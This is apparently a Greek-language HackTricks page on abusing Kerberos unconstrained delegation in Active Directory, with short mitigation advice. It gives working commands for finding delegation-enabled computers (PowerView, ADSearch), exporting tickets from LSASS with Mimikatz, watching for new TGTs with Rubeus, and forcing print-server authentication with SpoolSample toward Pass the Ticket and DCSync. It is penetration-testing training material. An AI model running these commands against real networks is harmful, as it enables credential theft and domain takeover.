# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Αυτή είναι μια δυνατότητα που μπορεί να ρυθμίσει ένας Διαχειριστής Τομέα σε οποιονδήποτε **Υπολογιστή** μέσα στον τομέα. Έτσι, κάθε φορά που ένας **χρήστης συνδέεται** στον Υπολογιστή, ένα **αντίγραφο του TGT** αυτού του χρήστη θα **σταλεί μέσα στο TGS** που παρέχεται από τον DC **και θα αποθηκευτεί στη μνήμη στο LSASS**. Έτσι, αν έχετε δικαιώματα Διαχειριστή στη μηχανή, θα μπορείτε να **dump τα εισιτήρια και να προσποιηθείτε τους χρήστες** σε οποιαδήποτε μηχανή.

Έτσι, αν ένας διαχειριστής τομέα συνδεθεί σε έναν Υπολογιστή με ενεργοποιημένη τη δυνατότητα "Unconstrained Delegation", και έχετε τοπικά δικαιώματα διαχειριστή σε αυτή τη μηχανή, θα μπορείτε να dump το εισιτήριο και να προσποιηθείτε τον Διαχειριστή Τομέα οπουδήποτε (domain privesc).

Μπορείτε να **βρείτε αντικείμενα Υπολογιστή με αυτό το χαρακτηριστικό** ελέγχοντας αν το [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) χαρακτηριστικό περιέχει [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Μπορείτε να το κάνετε αυτό με ένα φίλτρο LDAP του ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, το οποίο είναι αυτό που κάνει το powerview:

<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
## Powerview
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
<strong>## ADSearch
</strong>ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Export tickets with Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
.\Rubeus.exe monitor /targetuser:<username> /interval:10 #Check every 10s for new TGTs</code></pre>

Φορτώστε το εισιτήριο του Διαχειριστή (ή του θύματος χρήστη) στη μνήμη με **Mimikatz** ή **Rubeus για ένα** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Περισσότερες πληροφορίες: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Περισσότερες πληροφορίες σχετικά με την Unconstrained delegation στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

Εάν ένας επιτιθέμενος είναι σε θέση να **συμβιβάσει έναν υπολογιστή που επιτρέπεται για "Unconstrained Delegation"**, θα μπορούσε να **παγιδεύσει** έναν **Print server** να **συνδεθεί αυτόματα** σε αυτόν **αποθηκεύοντας ένα TGT** στη μνήμη του διακομιστή.\
Στη συνέχεια, ο επιτιθέμενος θα μπορούσε να εκτελέσει μια **επίθεση Pass the Ticket για να προσποιηθεί** τον λογαριασμό υπολογιστή του Print server.

Για να κάνετε έναν εκτυπωτή server να συνδεθεί σε οποιαδήποτε μηχανή μπορείτε να χρησιμοποιήσετε [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Αν το TGT προέρχεται από έναν ελεγκτή τομέα, μπορείτε να εκτελέσετε μια[ **DCSync attack**](acl-persistence-abuse/index.html#dcsync) και να αποκτήσετε όλους τους κατακερματισμούς από τον DC.\
[**Περισσότερες πληροφορίες σχετικά με αυτήν την επίθεση στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Εδώ είναι άλλοι τρόποι για να προσπαθήσετε να αναγκάσετε μια αυθεντικοποίηση:**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Mitigation

- Περιορίστε τις συνδέσεις DA/Admin σε συγκεκριμένες υπηρεσίες
- Ορίστε "Ο λογαριασμός είναι ευαίσθητος και δεν μπορεί να ανατεθεί" για προνομιακούς λογαριασμούς.

{{#include ../../banners/hacktricks-training.md}}
